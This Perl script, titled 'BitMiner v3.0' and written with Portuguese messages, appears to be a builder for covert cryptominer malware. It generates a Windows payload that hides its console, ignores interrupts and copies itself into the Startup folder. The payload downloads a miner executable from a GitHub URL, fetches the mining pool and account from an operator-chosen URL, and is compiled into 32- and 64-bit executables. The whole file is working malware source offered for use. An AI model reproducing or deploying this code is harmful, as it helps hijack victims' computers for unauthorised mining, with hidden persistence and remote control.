#!/usr/bin/perl -w
use Term::ANSIColor qw[color];
use Archive::Zip;
use LWP::Simple qw[getstore];
use Config;
use Cwd;

if($Config{osname} =~ m/win/i){
  system("cls");
}else{
  system("clear");
}

print color("GREEN");
print <<'ART';
                ,____
                |---.\
        ___     |    `
       / .-\  ./=)
      |  |"|_/\/|
      ;  |-;| /_|
     / \_| |/ \ |
    /      \/\( |
    |   /  |` ) |
    /   \ _/    |
   /--._/  \    |
   `/|)    |    /
     /     |   |
   .'      |   |
  /         \  |
 (_.-.__.__./  /
ART
print color("reset");
print "\n  BitMiner v3.0\n\n";

if(@ARGV){
  if(@ARGV > 1){
    print "\n[", color("YELLOW"),"!",color("reset"), "] Somente um parametro por vez permitido !\n";
    exit 0;
  }
  foreach(@ARGV){
    if($_ =~ m/--install-compiler/){
      unless($< == 0){
        print "Voce precisar executar esse programa como administrador !\n";
        exit 0;
      }
      my $zip = undef;
      print "\n[", color("YELLOW"),"!",color("reset"), "] Baixando o compilador", color("RED"),"...",color("reset"), "\n\n";
      getstore("http://indigostar.com/download/perl2exe-24.00-win.zip", "perl2exe.zip");
      $zip = Archive::Zip->new;
      $zip->read("perl2exe.zip");
      $zip->extractTree();
      unlink "perl2exe.zip";
      rename "perl2exe-24.00-win", "perl2exe";
      system("move perl2exe /");
      print "\n[", color("YELLOW"),"!",color("reset"), "] Sucesso !\n";
      exit 0;
    }
    elsif($_ =~ m/(\w)\.(\w)/){
      generate($_);
    }
    else{
      print "\n[", color("YELLOW"),"!",color("reset"), "] Parametro invalido!\n";
    }
  }
}else{
  print "\n[", color("YELLOW"),"!",color("reset"), "] Nenhum parametro informado !\n";
  exit 0;
}

sub generate{
  $_ = "http://" . $_ if $_ !~ m/^(http|https):\/\//;
  $_ =~ s/\/$//;
  open(OUTPUT, ">", "output.pl");
  print OUTPUT <<EXE;
#!/usr/bin/perl -w
use Win32::HideConsole qw[hide_console];
use LWP::UserAgent qw[get agent decoded_content];
use LWP::Simple qw[getstore];
use Config;
use Cwd;

\$SIG{INT} = 'IGNORE';
hide_console;

#perl2exe_include Win32::HideConsole
#perl2exe_include LWP::UserAgent
#perl2exe_include LWP::Simple
#perl2exe_include Config
#perl2exe_include Cwd

my (\$response, \$disk, \$ua) = undef;
\$disk = getcwd;
if(\$disk =~ m/(\\w):\\/(\\w)/){\$disk = \$1;}
\$ua = LWP::UserAgent->new;
\$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
while(1){
  if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
    system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
  }
  while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
    if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
    }else{
      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
    }
    if(-e \"NsCpuCNMiner.exe\"){
      system(\"move NsCpuCNMiner.exe %AppData%\");
    }else{
      next;
    }
  }
  \$response = \$ua->get(\"$_[0]\");
  if(\$response->decoded_content =~ m/miner->host:(.*?);email:(.*?);/){
    system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
  }
}
EXE
  close(OUTPUT);
  my $unit = getcwd;
  if($unit =~ m/(\w)\:\/(\w)/){$unit = $1;}
  if($^V =~ m/5.24.1/){
    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win32-5.24.1 -o output_32.exe output.pl");  
    if(-e "output_32.exe"){
      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
    }else{
      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
    }
    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win64-5.24.1 -o output_64.exe output.pl");
    if(-e "output_64.exe"){
      print "\nExecutavel de 64 bits gerado com sucesso !\n";
    }else{
      print "\nExecutavel de 64 bits nao foi gerado !\n";
    }
  }
  if($^V =~ m/5.24.0/){
    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win32-5.24.0 -o output_32.exe output.pl");
    if(-e "output_32.exe"){
      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
    }else{
      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
    }
    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win64-5.24.0 -o output_64.exe output.pl");
    if(-e "output_64.exe"){
      print "\nExecutavel de 64 bits gerado com sucesso !\n";
    }else{
      print "\nExecutavel de 64 bits nao foi gerado !\n";
    }
  }
  unlink "output.pl";
}